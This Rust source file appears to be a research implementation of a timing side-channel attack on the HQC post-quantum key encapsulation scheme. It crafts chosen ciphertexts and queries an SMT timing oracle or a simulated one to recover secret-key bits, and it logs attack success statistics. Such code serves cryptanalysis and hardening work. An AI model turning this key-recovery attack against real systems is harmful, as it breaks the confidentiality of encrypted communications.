                let failure_rate = overlap.1 as f64 / test_set.samples as f64;
                let estimated_attack_success_prob = (1. - failure_rate).powi(trials as i32);

                let probs = Self::compute_failure_and_success_probability(
                    &test_set,
                    w_lo,
                    failed_sets.iter(),
                    trials,
                );
                let deviation =
                    (estimated_attack_success_prob - probs.attack_success_probability).abs();
                assert!(deviation < 0.00000001, "{deviation}");

                mutation_winners[**mutation] += 1;
                total_winners += 1;

                let two_probs = Self::compute_failure_and_success_probability(
                    &test_set,
                    w_lo,
                    failed_sets[..2].iter(),
                    trials,
                );

                debug!("improvement: pfail={:.3}% attack_success={:.3}% mutation={:?} with {tester_size} testers, overlap={overlap:?}",
                failure_rate * 100.0,
                estimated_attack_success_prob * 100.0,
                mutations[**mutation],
                );
                debug!(
                    "two:         pfail={:.3}% attack_success={:.3}%",
                    two_probs.tester_failure_probability * 100.0,
                    two_probs.attack_success_probability * 100.0,
                );
                let validation_probs = Self::compute_failure_and_success_probability(
                    &validation_set,
                    w_lo,
                    Self::compute_failed_sets(&ecs, &validation_set, v, cdw).iter(),
                    trials,
                );
                debug!("validation probabilities: {validation_probs:?}");
                if estimated_attack_success_prob >= required_attack_success_prob
                    && validation_probs.attack_success_probability >= 0.9
                // && two_probs.attack_success_probability >= 0.77
                {
                    return (ecs, true);
                }
                improvements_since_no_improvement += 1;
            } else {
                no_improvement += 1;
                if no_improvement >= increase_test_size_wait {
                    if improvements_since_no_improvement == 0 {
                        return (ecs, false);
                    }
                    improvements_since_no_improvement = 0;
                    no_improvement = 0;
                    increase_test_size_wait /= 2;
                    required_samples *= 2;
                    debug!(
                        "Creating new testset: {} - speedup: {}",
                        required_samples,
                        opts / required_samples
                    );
                    test_set =
                        Self::generate_test_set(rng, &weight_distribution, w_hi, required_samples);
                    failed_sets = Self::compute_failed_sets(&ecs, &test_set, v, cdw);
                }
            }
        }
    }

    fn shift_by(shift: u32) -> Poly {
        let shift = shift % T::PARAM_N;
        let mut shift_poly = Poly::zero(T::VEC_N_SIZE_256);
        let shift_poly_slice: &mut [u64] =
            &mut bytemuck::cast_slice_mut(&mut shift_poly.v)[..T::VEC_N_SIZE_64];
        shift_poly_slice[(shift / 64) as usize] |= 1 << (shift % 64);
        shift_poly
    }

    fn precompute(rng: &mut impl Rng) -> Precomputation {
        // only necessary for HQC round 3, but it doesn't hurt the round 4 attack (because of the added salt)
        let m = T::find_high_seedexpansion_message(rng);
        debug!(
            "Found message with high number of seedexpansions: {}",
            format_hex(m.iter().copied())
        );

        let cdw = T::code_encode(&m);

        let e_block = 0;
        let mut f = OpenOptions::new()
            .create(true)
            .write(true)
            .append(true)
            .open("ecs.txt")
            .unwrap();

        loop {
            let (ecs, success) = Self::const_blk_exclude_higher_weight_vary_l0(
                rng,
                &cdw,
                e_block,
                1,
                5,
                match T::PARAM_SECURITY {
                    128 => 3,
                    192 => 4,
                    256 => 4,
                    _ => panic!("unknown security parameter"),
                },
            );

            writeln!(f, "m={}", format_hex(m.iter().copied())).unwrap();
            debug!("Found ecs:",);
            for ec in ecs.iter() {
                let ec_hex = format_hex(ec.iter().flat_map(|x| x.to_ne_bytes()));
                writeln!(f, "{}", ec_hex).unwrap();
                let ec_hex = format_hex(ec.iter().flat_map(|x| x.to_ne_bytes()));
                debug!("{}", ec_hex);
            }
            writeln!(f).unwrap();
            f.flush().unwrap();

            if success {
                return Precomputation { m, ecs };
            }
        }
    }

    fn recover_key(
        rng: &mut impl Rng,
        pre: &Precomputation,
        oracle: &mut impl SideChannelOracle,
        cr: CalibrationResult,
        salt: Option<Vec<u8>>,
        pk: PublicKeyRef,
        sk: SecretKeyRef,
        additional_bits: u64,
    ) -> AttackStatistics {
        let type_name = std::any::type_name::<T>().split(':').last().unwrap();
        debug!("Recovering key for {type_name}");

        // build foundations for zero tester
        // generate constant error block

        // generate a ciphertext with a high number of seedexpansions or small numerands
        let m = &pre.m;

        let e_block = 0;

        let ecs = &pre.ecs;

        // recover zero blocks of x and y for various shifts

        // range starts at 1: excludes e_block (always first block)
        let flip_blocks = sample_cww_indexes(rng, T::PARAM_DELTA, 1..T::PARAM_N1);
        assert!(flip_blocks.iter().all(|x| *x as usize != e_block));

        let pks = T::public_key_from_string(pk.as_ref());

        let sks = T::secret_key_from_string(sk.as_ref());

        let mut perfect_oracle =
            SimulatedLocalOracle::<T>::new(sk.to_owned(), m.clone(), OracleMode::Perfect);
        let n = 2000;
        let wanted_success_chance = 0.99;
        let max_failure_chance = 1.0 - wanted_success_chance.pow(Float::with_val(PREC, 1.0) / n);
        debug!("Max failure chance: {max_failure_chance}");
        let mut oracle: MajorityVotingOracle<OracleQueryCounter<_>> = MajorityVotingOracle::new(
            OracleQueryCounter::from(oracle),
            cr.tpr,
            cr.tnr,
            0.0001,
            0.0001,
        );
        let start = Instant::now();
        let mut true_count = 0;
        let mut false_count = 0;
        let mut false_positives = 0;
        let mut false_negatives = 0;
        let mut true_positives = 0;
        let mut true_negatives = 0;

        let mut attack_stats = AttackStatistics {
            wrong_zeros_x: u64::MAX,
            wrong_zeros_y: u64::MAX,
            recovered_zeros_x: u64::MAX,
            recovered_zeros_y: u64::MAX,
            queries: u64::MAX,
            traces: None,
            cr: None,
            duration_seconds: f64::NAN,
            test_outcomes: Vec::new(),
            attack_tpr: f64::NAN,
            attack_tnr: f64::NAN,
        };

        let mut bit_status_x = vec![BitStatus::Unknown; T::PARAM_N as usize];
        let mut bit_status_y = vec![BitStatus::Unknown; T::PARAM_N as usize];
        let mut shifts = vec![0, 192, 92, 297, 238, 115];
        let mut trng = rand::thread_rng();
        while shifts.len() < T::PARAM_N2 as usize {
            let pos = trng.gen_range(0..T::PARAM_N2);
            if !shifts.contains(&pos) {
                shifts.push(pos);
            }
        }
        let mut test_outcomes = vec![(0, 0); ecs.len()];

        let mut oracle_correct_positives = 0;
        let mut oracle_correct_negatives = 0;

        for shift_offset in shifts.iter() {
            for key_part in [KeyPart::Y, KeyPart::X] {
                for block in 0..T::PARAM_N1 {
                    let recovered = bit_status_x
                        .iter()
                        .map(|x| (*x == BitStatus::KnownZero) as u64)
                        .sum::<u64>()
                        + bit_status_y
                            .iter()
                            .map(|x| (*x == BitStatus::KnownZero) as u64)
                            .sum::<u64>();
                    let needed = (2 * T::PARAM_N * 50 / 100) as u64 + additional_bits;
                    debug!(
                        "Have {recovered}/{needed} bits in {:.02}s",
                        start.elapsed().as_secs_f64()
                    );
                    if recovered >= needed {
                        break;
                    }
                    let bit_status = match key_part {
                        KeyPart::X => &mut bit_status_x,
                        KeyPart::Y => &mut bit_status_y,
                    };
                    let shift = T::PARAM_N2 * block + shift_offset;
                    let mut all_known = true;
                    for b in 0..T::PARAM_N2 {
                        let bit = (b as i32 - shift as i32).rem_euclid(T::PARAM_N as i32) as usize;
                        let s = &mut bit_status[bit];
                        match *s {
                            BitStatus::KnownZero => {
                                // don't update
                            }
                            BitStatus::Unknown | BitStatus::MaybeOne => {
                                all_known = false;
                            }
                        }
                    }
                    if all_known {
                        continue;
                    }
                    // let block_off = ((-(block as i32)).rem_euclid(T::PARAM_N1 as i32) as u32);
                    let mut judgement = Classification::ZeroBlock;
                    for (tester_no, ec) in ecs.iter().enumerate() {
                        let mut e = Poly::zero(T::VEC_N_SIZE_256);
                        let es: &mut [u64] =
                            &mut bytemuck::cast_slice_mut(&mut e.v)[..T::VEC_N_SIZE_64];
                        // e[flip_blocks] ^= 0xff
                        for &b in flip_blocks.iter() {
                            // flip a few blocks in e
                            // one more corruption of a RM block will cause the RS decoder to fail
                            let b = Self::extract_block_mut(es, b as usize);
                            for w in b.iter_mut() {
                                *w ^= u64::MAX;
                            }
                        }
                        // e[block] ^= ec
                        let b = Self::extract_block_mut(es, e_block);
                        for (w, ecw) in b.iter_mut().zip(ec) {
                            *w ^= *ecw;
                        }

                        // construct ciphertext
                        let mut r2 = Poly::zero(T::VEC_N_SIZE_256);

                        let mut u = match key_part {
                            KeyPart::X => {
                                r2 = Self::shift_by(shift);
                                T::vect_mul(&Self::shift_by(shift), &pks.h)
                            }
                            KeyPart::Y => Self::shift_by(shift),
                        };
                        let u_slice: &mut [u64] =
                            &mut bytemuck::cast_slice_mut(&mut u.v)[..T::VEC_N_SIZE_64];

                        let er = T::encaps_chosen_inputs(
                            pk.as_ref(),
                            m.as_slice(),
                            bytemuck::cast_slice(u_slice),
                            bytemuck::cast_slice(r2.v.as_slice()),
                            bytemuck::cast_slice(e.v.as_slice()),
                            salt.as_deref(),
                        );

                        assert_eq!(er.status, oqs_sys::kem::OQS_STATUS::OQS_SUCCESS);
                        let ct = T::ciphertext_from_string(&er.ct);
                        let perfect_result = perfect_oracle.call(rng, &ct);
                        debug!("Perfect oracle result: {}", perfect_result);
                        if !oracle.call(rng, &ct) {
                            judgement = Classification::NonZeroBlock;
                            false_count += 1;
                            test_outcomes[tester_no].0 += 1;
                            if perfect_result {
                                debug!("False negative!");
                            } else {
                                oracle_correct_negatives += 1;
                            }
                            break;
                        } else {
                            true_count += 1;
                            test_outcomes[tester_no].1 += 1;
                            if !perfect_result {
                                debug!("False positive!");
                            } else {
                                oracle_correct_positives += 1;
                            }
                        }
                    }

                    // mark bit status for each bit in the tested block
                    for b in 0..T::PARAM_N2 {
                        let bit = (b as i32 - shift as i32).rem_euclid(T::PARAM_N as i32) as usize;
                        let s = &mut bit_status[bit];
                        match judgement {
                            Classification::NonZeroBlock => {
                                match *s {
                                    BitStatus::KnownZero => {
                                        // don't update
                                    }
                                    BitStatus::Unknown => {
                                        *s = BitStatus::MaybeOne;
                                    }
                                    BitStatus::MaybeOne => {
                                        // nothing new
                                    }
                                }
                            }
                            Classification::ZeroBlock => {
                                match *s {
                                    BitStatus::KnownZero => {
                                        // don't update
                                    }
                                    BitStatus::Unknown | BitStatus::MaybeOne => {
                                        *s = BitStatus::KnownZero;
                                    }
                                }
                            }
                        }
                    }

                    // debug information, not available in an actual attack
                    let sk_part = match key_part {
                        KeyPart::X => &sks.x,
                        KeyPart::Y => &sks.y,
                    };
                    let sk_part = T::vect_mul(&Self::shift_by(shift), sk_part);
                    let sk_block =
                        Self::extract_block(&bytemuck::cast_slice(&sk_part)[..T::VEC_N_SIZE_64], 0);
                    let skw: u32 = sk_block.iter().map(|x| x.count_ones()).sum();
                    let actual = if skw == 0 {
                        Classification::ZeroBlock
                    } else {
                        Classification::NonZeroBlock
                    };
                    match judgement {
                        Classification::NonZeroBlock => match actual {
                            Classification::NonZeroBlock => {
                                true_negatives += 1;
                            }
                            Classification::ZeroBlock => {
                                false_negatives += 1;
                            }
                        },
                        Classification::ZeroBlock => match actual {
                            Classification::NonZeroBlock => {
                                false_positives += 1;
                            }
                            Classification::ZeroBlock => {
                                true_positives += 1;
                            }
                        },
                    }
                }
            }
        }
        // check results for debugging
        for key_part in [KeyPart::X, KeyPart::Y] {
            let sk_part = match key_part {
                KeyPart::X => &sks.x,
                KeyPart::Y => &sks.y,
            };
            let bit_status = match key_part {
                KeyPart::X => &mut bit_status_x,
                KeyPart::Y => &mut bit_status_y,
            };
            let sk_slice: &[u64] = bytemuck::cast_slice(&sk_part.v);
            let mut wrong_zeros = 0;
            let mut known_zeros = 0;
            for (b, &s) in bit_status.iter().enumerate() {
                let actual = (sk_slice[b / 64] >> (b % 64)) == 1;
                match s {
                    BitStatus::KnownZero => {
                        if actual {
                            wrong_zeros += 1;
                        }
                        known_zeros += 1;
                    }
                    BitStatus::MaybeOne => {}
                    BitStatus::Unknown => {}
                }
            }
            info!("{key_part:?} wrong zeros: {}", wrong_zeros);

            match key_part {
                KeyPart::X => {
                    attack_stats.wrong_zeros_x = wrong_zeros;
                    attack_stats.recovered_zeros_x = known_zeros;
                }
                KeyPart::Y => {
                    attack_stats.wrong_zeros_y = wrong_zeros;
                    attack_stats.recovered_zeros_y = known_zeros;
                }
            }
            info!(
                "Found {known_zeros}/{} = {:.02}%",
                T::PARAM_N,
                known_zeros as f64 / T::PARAM_N as f64 * 100.
            );
        }

        attack_stats.queries = oracle.inner.queries();
        attack_stats.test_outcomes = test_outcomes;
        attack_stats.attack_tpr = oracle_correct_positives as f64 / true_count as f64;
        attack_stats.attack_tnr = oracle_correct_negatives as f64 / false_count as f64;
        info!("Required {} queries", oracle.inner.queries(),);
        debug!("oracle true={true_count} false={false_count}");
        debug!("bits true_positives={true_positives} true_negatives={true_negatives}");
        debug!("bits false_positives={false_positives} false_negatives={false_negatives}");
        debug!("test_outcomes={:?}", &attack_stats.test_outcomes);
        attack_stats
    }
}

#[derive(Debug, Clone, Copy)]
enum KeyPart {
    X,
    Y,
}

#[derive(Debug, Clone, Copy)]
enum Classification {
    NonZeroBlock,
    ZeroBlock,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BitStatus {
    KnownZero,
    MaybeOne,
    Unknown,
}

#[derive(Debug, Clone)]
struct AttackStatistics {
    wrong_zeros_x: u64,
    wrong_zeros_y: u64,
    recovered_zeros_x: u64,
    recovered_zeros_y: u64,
    queries: u64,
    traces: Option<u64>,
    cr: Option<CalibrationResult>,
    duration_seconds: f64,
    test_outcomes: Vec<(u32, u32)>,
    attack_tpr: f64,
    attack_tnr: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Precomputation {
    m: Vec<u8>,
    ecs: Vec<Vec<u64>>,
}

fn get_sibling() -> (usize, usize) {
    let f = File::open("/sys/devices/system/cpu/cpu0/topology/thread_siblings_list").unwrap();
    let mut br = BufReader::new(f);
    let mut s = String::new();
    br.read_line(&mut s).unwrap();
    let mut s = s.split(|x: char| !x.is_ascii_digit());
    let a = s.next().unwrap().trim().parse().unwrap();
    let b = s.next().unwrap().trim().parse().unwrap();
    (a, b)
}

use clap::{Parser, Subcommand};

#[derive(Parser, Debug, Clone)]
#[command(author, version, about, long_about = None)]
/// Perform attacks using either a simulated or a real SMT oracle.
struct AttackArgs {
    /// Number of attacks
    #[arg(long, default_value_t = 1000)]
    num_attacks: u32,

    #[clap(flatten)]
    oracle_mode_args: OracleModeArgs,

    #[arg(long)]
    stats_file: PathBuf,

    #[arg(long, default_value_t = 5)]
    additional_bits: u64,
}

#[derive(Debug, Clone, Parser)]
#[group(required = true, multiple = false)]
struct OracleModeArgs {
    /// SMT attack
    #[arg(long)]
    smt: bool,

    /// Oracle to use
    #[arg(long)]
    simulated_oracle_mode: Option<OracleMode>,

    /// Simulated noise: failure probability
    #[arg(long)]
    simulated_noise: Option<f64>,
}

/// Measure the oracle accuracy for various number of traces (n_traces are taken and then we compute their median).
/// Optionally, dump the observed timings into a CSV file.
#[derive(Parser, Debug, Clone)]
#[command()]
struct MeasureOracleArgs {
    #[arg(long)]
    num_keys: u32,

    #[arg(long)]
    /// Measure oracle accuracy for up to this many traces
    max_n_traces: u32,

    #[arg(long)]
    /// Path to write n_traces dependent oracle accuracy to
    dump_accuracy: Option<PathBuf>,

    #[arg(long)]
    /// Path to write timings of each trace to (including whether the timings were performed on a fast or slow ciphertext)
    dump_timings: Option<PathBuf>,
}

#[derive(Subcommand, Debug, Clone)]
enum SCmd {
    #[command(name = "attack")]
    Attack(AttackArgs),
    #[command(name = "measure")]
    MeasureOracle(MeasureOracleArgs),
}

#[derive(Parser, Clone, Debug)]
struct Cli {
    #[command(subcommand)]
    command: SCmd,
}

fn main() -> Result<(), anyhow::Error> {
    tracing_subscriber::registry()
        .with(fmt::layer())
        .with(tracing_subscriber::EnvFilter::from_default_env())
        .init();
    let args = Cli::parse();
    let attack_args = match &args.command {
        SCmd::Attack(args) => Some(args),
        SCmd::MeasureOracle(_) => None,
    };
    let measure_args = match &args.command {
        SCmd::Attack(_) => None,
        SCmd::MeasureOracle(args) => Some(args),
    };
    debug!("Starting...");

    oqs::init();

    let mut hasher = Sha256::new();
    hasher.update(b"seed3");
    let result = hasher.finalize();

    type T = hqc::HqcR4128;
    T::init_seed(0xc0ffee);

    let precomputation_path = format!("precomputation_{}.json", T::PARAM_SECURITY);

    let pre: Option<Precomputation> = match std::fs::read(&precomputation_path) {
        Ok(pre) => match serde_json::from_slice(&pre) {
            Ok(x) => {
                info!("Using cached precomputation: {x:?}");
                Some(x)
            }
            Err(e) => {
                info!("Failed loading precomputation: {e}");
                None
            }
        },
        Err(_) => None,
    };
    let pre = pre.unwrap_or_else(|| {
        let mut rng = ChaCha12Rng::from_seed(result.as_slice().try_into().unwrap());
        let pre = Attack::<T>::precompute(&mut rng);
        std::fs::write(precomputation_path, serde_json::to_string(&pre).unwrap()).unwrap();
        pre
    });
    assert_eq!(TryInto::<u32>::try_into(pre.m.len()).unwrap(), T::PARAM_K);

    let oracle_ty = if attack_args
        .map(|args| args.oracle_mode_args.smt)
        .unwrap_or(false)
        || measure_args.map(|_| true).unwrap_or(false)
    {
        let mut s = String::new();
        File::open("/sys/devices/system/cpu/smt/active")?.read_to_string(&mut s)?;
        if s.trim() != "1" {
            error!("SMT must be enabled");
            return Ok(());
        }
        OracleTy::SMTOracle
    } else {
        OracleTy::SimulatedLocal
    };
    let oracle_mode = attack_args.as_ref().and_then(|args| {
        args.oracle_mode_args
            .simulated_noise
            .map(|x| OracleMode::SimulatedNoise { failure_rate: x })
            .or(args.oracle_mode_args.simulated_oracle_mode)
    });

    info!("Running with oracle_ty={oracle_ty:?} oracle_mode={oracle_mode:?}");

    std::fs::create_dir_all("data").unwrap();

    let mut test_outcomes_str = String::new();
    for i in 0..pre.ecs.len() {
        test_outcomes_str += &format!("test_outcomes_{i}_false,");
        test_outcomes_str += &format!("test_outcomes_{i}_true");
        if i != pre.ecs.len() - 1 {
            test_outcomes_str += ",";
        }
    }

    if oracle_ty == OracleTy::SMTOracle {
        rayon::ThreadPoolBuilder::new()
            .num_threads(num_cpus::get_physical())
            .build_global()
            .unwrap();
    }

    if let Some(measure_args) = measure_args {
        let make_csv =
            |fname: &Option<PathBuf>, header: &str| -> Option<Arc<Mutex<BufWriter<File>>>> {
                fname.as_ref().map(|f| {
                    let mut f = BufWriter::new(File::create(f).unwrap());
                    f.write_all(header.as_bytes()).unwrap();
                    Arc::new(std::sync::Mutex::new(f))
                })
            };
        let dump_accuracy = make_csv(&measure_args.dump_accuracy, "n_traces,accuracy,diff\n");
        let dump_timings = make_csv(&measure_args.dump_timings, "ty,time,diff\n");

        let n = measure_args.num_keys;
        assert_eq!(oracle_ty, OracleTy::SMTOracle, "wrong oracle ty");
        let completed = AtomicU32::new(0);
        let _n: usize = (0..n)
            .into_par_iter()
            .map(|i| {
                let span = info_span!("attack", id = i);
                let _enter = span.enter();
                T::init_seed(i as u64);
                let mut hasher = Sha256::new();
                hasher.update(b"seed3_");
                hasher.update(format!("{i}_").as_bytes());
                let result = hasher.finalize();
                let mut rng = ChaCha12Rng::from_seed(result.as_slice().try_into().unwrap());
                let (pk, sk) = T::oqs().keypair().unwrap();

                assert!(
                    matches!(T::LEAKAGE, TimingLeakage::DivisionLatency),
                    "wrong leakage"
                );
                for min_diff in 0..=55 {
                    let (salt, diff) =
                        T::find_low_division_latency_salt(&mut rng, (&pk).into(), &pre.m, min_diff);
                    assert_eq!(oracle_ty, OracleTy::SMTOracle);
                    assert!(oracle_mode.is_none());
                    let pk = (&pk).into();
                    let fast = get_fast_ciphertext::<T>(pk, pre.m.clone(), Some(&salt));
                    {
                        let core = CORE_ALLOCATOR.alloc();
                        let _cr = calibrate::<T>(
                            &core,
                            &sk,
                            &fast,
                            || {
                                let oqs = T::oqs();
                                let ct = oqs.encapsulate(pk);
                                T::ciphertext_from_string(&ct.unwrap().0.bytes)
                            },
                            100,
                            dump_accuracy.as_ref().map(Arc::clone),
                            dump_timings.as_ref().map(Arc::clone),
                            diff,
                        );
                    }
                }

                let (salt, diff) =
                    T::find_low_division_latency_salt(&mut rng, (&pk).into(), &pre.m, 55);
                assert_eq!(oracle_ty, OracleTy::SMTOracle);
                assert!(oracle_mode.is_none());
                let pk = (&pk).into();
                let fast = get_fast_ciphertext::<T>(pk, pre.m.clone(), Some(&salt));
                {
                    let core = CORE_ALLOCATOR.alloc();
                    for n_traces in 1..=measure_args.max_n_traces {
                        let _cr = calibrate::<T>(
                            &core,
                            &sk,
                            &fast,
                            || {
                                let oqs = T::oqs();
                                let ct = oqs.encapsulate(pk);
                                T::ciphertext_from_string(&ct.unwrap().0.bytes)
                            },
                            n_traces,
                            dump_accuracy.as_ref().map(Arc::clone),
                            dump_timings.as_ref().map(Arc::clone),
                            diff,
                        );
                    }
                }
                let v = completed.fetch_add(1, Ordering::SeqCst);
                info!("Completed {} keys", v + 1);
            })
            .count();
    } else if let Some(attack_args) = attack_args {
        let path = &attack_args.stats_file;
        let mut f = File::create(path).unwrap();
        f.write_all(
        format!("key_bits,recovered_zeros_x,recovered_zeros_y,wrong_zeros_x,wrong_zeros_y,queries,traces,calibration_traces,threshold,tpr,tnr,attack_tpr,attack_tnr,duration_seconds,{test_outcomes_str}\n")
            .as_bytes(),
    )
    .unwrap();
        let f = Arc::new(std::sync::Mutex::new(f));

        let n = attack_args.num_attacks;
        let stats: Vec<_> = (0..n)
            .into_par_iter()
            .map(|i| {
                let span = info_span!("attack", id = i);
                let _enter = span.enter();
                T::init_seed(i as u64);
                let start = Instant::now();
                let mut hasher = Sha256::new();
                hasher.update(b"seed3_");
                hasher.update(format!("{i}_").as_bytes());
                let result = hasher.finalize();
                let mut rng = ChaCha12Rng::from_seed(result.as_slice().try_into().unwrap());
                let (pk, sk) = T::oqs().keypair().unwrap();

                let salt = match T::LEAKAGE {
                    TimingLeakage::RejectionSampling => None,
                    TimingLeakage::DivisionLatency => Some({
                        if oracle_ty == OracleTy::SimulatedLocal {
                            debug!("Skipping salt generation for faster simulation");
                            let mut salt = vec![0u8; T::VEC_K_SIZE_BYTES];
                            rng.fill(salt.as_mut_slice());
                            salt
                        } else {
                            T::find_low_division_latency_salt(&mut rng, (&pk).into(), &pre.m, 55).0
                        }
                    }),
                };
                let stats = match (oracle_ty, oracle_mode) {
                    (OracleTy::SimulatedLocal, Some(mode)) => {
                        let mut inner =
                            SimulatedLocalOracle::<T>::new(sk.to_owned(), pre.m.clone(), mode);
                        let tr = match mode {
                            OracleMode::Ideal | OracleMode::Perfect => 1.0,
                            OracleMode::SimulatedNoise { failure_rate } => 1.0 - failure_rate,
                        };
                        Attack::<T>::recover_key(
                            &mut rng,
                            &pre,
                            &mut inner,
                            CalibrationResult {
                                threshold: 0,
                                tpr: tr,
                                tnr: tr,
                                num_traces: 0,
                            },
                            salt,
                            (&pk).into(),
                            (&sk).into(),
                            attack_args.additional_bits,
                        )
                    }
                    (OracleTy::SMTOracle, None) => {
                        let (mut inner, cr) = SMTOracle::<T>::new(
                            sk.to_owned(),
                            (&pk).into(),
                            salt.as_deref(),
                            pre.m.clone(),
                        )
                        .unwrap();
                        debug!("Calibration result: {cr:?}");

                        let result = Attack::<T>::recover_key(
                            &mut rng,
                            &pre,
                            &mut inner,
                            cr.clone(),
                            salt,
                            (&pk).into(),
                            (&sk).into(),
                            attack_args.additional_bits,
                        );
                        info!("Took {} traces", inner.num_traces);
                        AttackStatistics {
                            traces: Some(inner.num_traces),
                            cr: Some(cr),
                            ..result
                        }
                    }
                    _ => {
                        error!("Unsupported oracle config {oracle_ty:?} {oracle_mode:?}");
                        panic!();
                    }
                };

                AttackStatistics {
                    duration_seconds: start.elapsed().as_secs_f64(),
                    ..stats
                }
            })
            .inspect(|s| {
                let mut f = f.lock().unwrap();
                let mut test_outcomes_str = String::new();
                for (i, (false_count, true_count)) in s.test_outcomes.iter().enumerate() {
                    test_outcomes_str += &format!(
                        "{false_count},{true_count}{}",
                        if i != s.test_outcomes.len() - 1 {
                            ","
                        } else {
                            ""
                        }
                    );
                }
                f.write_all(
                    format!(
                        "{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}\n",
                        T::PARAM_N,
                        s.recovered_zeros_x,
                        s.recovered_zeros_y,
                        s.wrong_zeros_x,
                        s.wrong_zeros_y,
                        s.queries,
                        s.traces.map(|x| format!("{}", x)).unwrap_or("".to_owned()),
                        s.cr.as_ref()
                            .map(|x| format!("{}", x.num_traces))
                            .unwrap_or("".to_owned()),
                        s.cr.as_ref()
                            .map(|x| format!("{}", x.threshold))
                            .unwrap_or("".to_owned()),
                        s.cr.as_ref()
                            .map(|x| format!("{}", x.tpr))
                            .unwrap_or("".to_owned()),
                        s.cr.as_ref()
                            .map(|x| format!("{}", x.tnr))
                            .unwrap_or("".to_owned()),
                        s.attack_tpr,
                        s.attack_tnr,
                        s.duration_seconds,
                        test_outcomes_str,
                    )
                    .as_bytes(),
                )
                .unwrap();
                f.flush().unwrap();
            })
            .collect();

        info!(
            "Attack success chance: {}%",
            stats
                .iter()
                .map(
                    |x| (x.recovered_zeros_x + x.recovered_zeros_y >= (T::PARAM_N + 5) as u64
                        && x.wrong_zeros_x == 0
                        && x.wrong_zeros_y == 0) as u64
                )
                .sum::<u64>() as f64
                / n as f64
                * 100.0
        );
        let mut qs: Vec<_> = stats.iter().map(|x| x.queries).collect();
        qs.sort_unstable();
        info!("Median queries: {}", qs[qs.len() / 2]);
        info!(
            "Mean zeros recovered: {}%",
            stats
                .iter()
                .map(|x| x.recovered_zeros_x + x.recovered_zeros_y)
                .sum::<u64>() as f64
                / (n as u64 * 2 * T::PARAM_N as u64) as f64
                * 100.0
        );
        info!(
            "Attacks with wrong zeros: {}%",
            stats
                .iter()
                .map(|x| (x.wrong_zeros_x + x.wrong_zeros_y > 0) as u64)
                .sum::<u64>() as f64
                / n as f64
                * 100.0
        );
    }

    Ok(())
}

#[cfg(test)]
mod test {
    use super::*;
    fn test_shift_hqc<T: Hqc + Send>() {
        let mut rng = rand::thread_rng();
        let e = Poly::rand(&mut rng, T::VEC_N_SIZE_256);
        let e = T::vect_mul(&e, &e);
        for b in 0..T::PARAM_N {
            let twice1 = T::vect_mul(
                &Attack::<T>::shift_by(b),
                &T::vect_mul(&Attack::<T>::shift_by(b), &e),
            );
            let twice2 = T::vect_mul(&Attack::<T>::shift_by(2 * b), &e);
            assert_eq!(twice1, twice2, "{}", b);
        }
        let id = Attack::<T>::shift_by(0);
        assert_eq!(T::vect_mul(&id, &e), e);
    }

    #[test]
    fn test_shift() {
        use crate::hqc::*;
        test_shift_hqc::<Hqc128>();
        test_shift_hqc::<Hqc192>();
        test_shift_hqc::<Hqc256>();
        test_shift_hqc::<HqcR4128>();
        test_shift_hqc::<HqcR4192>();
        test_shift_hqc::<HqcR4256>();
    }
}
